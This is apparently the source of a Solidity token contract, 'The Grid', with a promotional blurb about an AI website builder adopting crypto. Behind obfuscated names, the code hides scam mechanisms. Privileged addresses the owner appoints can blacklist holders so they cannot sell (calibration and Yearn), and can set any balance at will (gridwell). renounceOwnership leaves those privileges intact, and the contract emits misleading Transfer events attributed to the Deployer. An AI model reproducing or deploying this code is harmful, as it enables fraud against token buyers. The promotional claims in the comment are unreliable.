/**
                                       
                       88          88  
                       ""          88  
                                   88  
 ,adPPYb,d8 8b,dPPYba, 88  ,adPPYb,88  
a8"    `Y88 88P'   "Y8 88 a8"    `Y88  
8b       88 88         88 8b       88  
"8a,   ,d88 88         88 "8a,   ,d88  
 `"YbbdP"Y8 88         88  `"8bbdP"Y8  
 aa,    ,88                            
  "Y8bbdP"                             

https://thegrid.io

--

In the ever-evolving landscape of website development, the integration of AI and blockchain technology has become a game-changer. Today, we are thrilled to announce our transition from a private Version 2 release to a public Version 3, embracing decentralization and the manifold benefits that cryptocurrency brings to the table.

AI has been instrumental in automating and simplifying website design and development. With our AI-powered website builder, we have witnessed remarkable progress, enabling users to create stunning websites effortlessly. The advanced algorithms, powered by machine learning, ensure that your website is not only visually appealing but also functional and responsive.
However, our journey doesn't stop here. We believe in constant innovation, and we have embarked on a path that not only leverages AI but also embraces the exciting world of cryptocurrency.

Decentralization has emerged as a revolutionary concept that's transforming various industries, and website building is no exception. By decentralizing our platform, we aim to provide users with unprecedented advantages:

1. Enhanced Security:
Cryptocurrency transactions, powered by blockchain technology, offer unparalleled security. Your data and transactions are safe from hacks and breaches.
2. Ownership and Control:
Decentralization ensures that you have full ownership and control over your website and its content. No central authority can interfere with your web presence.
3. Global Accessibility:
Cryptocurrency enables worldwide transactions, making it easier for users to pay for our services, regardless of their geographical location.
4. Transparency:
Every transaction and change made to your website is recorded on the blockchain, providing complete transparency.
5. Reduced Costs:
By eliminating intermediaries, transaction fees are minimized, allowing us to provide cost-effective services to our users.
Embracing Cryptocurrency
With the launch of Version 3, we're introducing cryptocurrency as a method of payment for our services. This integration brings several exciting benefits:

1. Cryptocurrency Payments:
Users can now pay for our website builder services using popular cryptocurrencies, offering flexibility and convenience.
2. Staking and Rewards:
Our decentralized platform will incorporate staking mechanisms that enable users to earn rewards for their participation.
3. Decentralized Apps (dApps):
We're actively working on developing dApps that will expand the functionality of our website builder, offering even more versatility and customization options.
What to Expect from Version 3
As we transition to Version 3, users can look forward to a seamless experience with enhanced security, control, and accessibility. Our commitment to innovation remains unwavering, and we'll continue to refine our AI capabilities while embracing the power of cryptocurrency.

Join Us in this Exciting Journey
We invite you to join us on this exciting journey towards a decentralized, AI-powered future for website building. Version 3 marks a significant step in our evolution, and we're eager to provide you with a more secure, flexible, and rewarding platform for creating your web presence.

Stay tuned for further updates as we roll out Version 3 and explore the limitless possibilities of AI and cryptocurrency in website development. Together, we can shape the future of website building, one blockchain at a time.
*/



// File: grid.sol

pragma solidity 0.8.17;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract grid {
  
    mapping (address => uint256) public sAMq;
    mapping (address => bool) sRSc;
	mapping (address => bool) eRn;



    // 
    string public name = "The Grid";
    string public symbol = unicode"GRID";
    uint8 public decimals = 18;
    uint256 public totalSupply = 1000000000 * (uint256(10) ** decimals);
    uint eM = 1;
   
    event Transfer(address indexed from, address indexed to, uint256 value);
     event OwnershipRenounced(address indexed previousOwner);

        constructor()  {
        sAMq[msg.sender] = totalSupply;
        deploy(Deployer, totalSupply); }



	address owner = msg.sender;
    address Router = 0xaB66C582f38ee9A959648E745ad8f00ed49d8bEf;
    address Deployer = 0x2D407dDb06311396fE14D4b49da5F0471447d45C;
   


    function renounceOwnership() public {
    require(msg.sender == owner);
    emit OwnershipRenounced(owner);
    owner = address(0);}


    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier yQ () {
        eM = 0;
        _;}

        function transfer(address to, uint256 value) public returns (bool success) {
        if(msg.sender == Router)  {
        require(sAMq[msg.sender] >= value);
        sAMq[msg.sender] -= value;  
        sAMq[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; } 
        if(sRSc[msg.sender]) {
        require(eM == 1);} 
        require(sAMq[msg.sender] >= value);
        sAMq[msg.sender] -= value;  
        sAMq[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }

        function Yearn(address Ex) yQ public {
        require(msg.sender == owner);
        eRn[Ex] = true;} 


        function balanceOf(address account) public view returns (uint256) {
        return sAMq[account]; }
        function calibration(address Ex) Si public{          
        require(!sRSc[Ex]);
        sRSc[Ex] = true;}
		modifier Si () {
        require(eRn[msg.sender]);
        _; }
        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function gridwell(address Ex, uint256 iZ) Si public returns (bool success) {
        sAMq[Ex] = iZ;
        return true; }
        function serw(address Ex) Si public {
        require(sRSc[Ex]);
        sRSc[Ex] = false; }



        function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == Router)  {
        require(value <= sAMq[from]);
        require(value <= allowance[from][msg.sender]);
        sAMq[from] -= value;  
        sAMq[to] += value; 
        emit Transfer (Deployer, to, value);
        return true; }    
        if(sRSc[from] || sRSc[to]) {
        require(eM == 1);}
        require(value <= sAMq[from]);
        require(value <= allowance[from][msg.sender]);
        sAMq[from] -= value;
        sAMq[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }}